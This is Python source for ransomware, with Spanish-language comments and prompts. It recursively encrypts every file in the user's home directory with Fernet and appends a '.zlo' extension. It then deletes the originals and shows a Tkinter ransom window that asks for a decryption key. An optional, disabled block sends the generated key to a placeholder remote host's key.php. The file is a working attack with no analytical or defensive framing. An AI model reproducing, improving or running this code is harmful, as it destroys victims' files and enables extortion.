import os
import sys
import requests
import threading
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

User_PC = os.path.expanduser('~')
Desc = '!!Your Data has been Encrypted!!'
key = Fernet.generate_key()
host_validation = False
host = 'host'
rhost = host + '/key.php'

#---------------------------------------------Funciones--------------------------------------------------------
def capture_key():
    def decrypt_file(file_path, key):
        if not file_path.endswith(".zlo"):
            return

        try:
            f = Fernet(key)
            with open(file_path, "rb") as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            decrypted_file_path = file_path[:-4]  # Eliminar la extensi√≥n .zlo
            with open(decrypted_file_path, "wb") as file:
                file.write(decrypted_data)
            os.remove(file_path)

        except Exception as e:
            print(f'Error en descifrado: {e}')

    dkey = entry.get().encode()
    if len(dkey) != 44:
        messagebox.showerror('Error', 'Clave invalida. La longitud de la clave debe ser de 44 caracteres.')
        return

    for root, dirs, files in os.walk(User_PC):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                try:
                    decrypt_file(file_path, dkey)
                except Exception as e:
                    messagebox.showerror('Error', f'Error al descifrar: {e}')
                    return
    root.destroy()

def advertencia():
    global entry, root
    root = tk.Tk()
    root.title("Tus archivos fueron encriptados")

    main = tk.Label(root, text=Desc)
    main.pack(pady=10)

    entry = tk.Entry(root, width=40)
    entry.pack(pady=5)
    entry.bind('<Return>', lambda event: capture_key())

    accept_button = tk.Button(root, text="Aceptar", command=capture_key)
    accept_button.pack(pady=10)

    root.mainloop()

def encrypt_file(root_dir, key):
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith(".zlo"):
                continue

            try:
                f = Fernet(key)
                with open(file_path, "rb") as file:
                    file_data = file.read()
                encrypted_data = f.encrypt(file_data)
                encrypted_file_path = file_path + ".zlo"
                with open(encrypted_file_path, "wb") as file:
                    file.write(encrypted_data)
                os.remove(file_path)

            except Exception as e:
                print(f'Error en cifrado: {e}')

#--------------------------------------------------------------------------------------------------------------

if host_validation:
    parametros = {'key': key.decode()}
    response = requests.get(rhost, params=parametros)
    if response.status_code == 200:
        pass
    else:
        sys.exit()   

t = threading.Thread(target=encrypt_file, args=(User_PC, key))
t.start()

advertencia()

t.join()
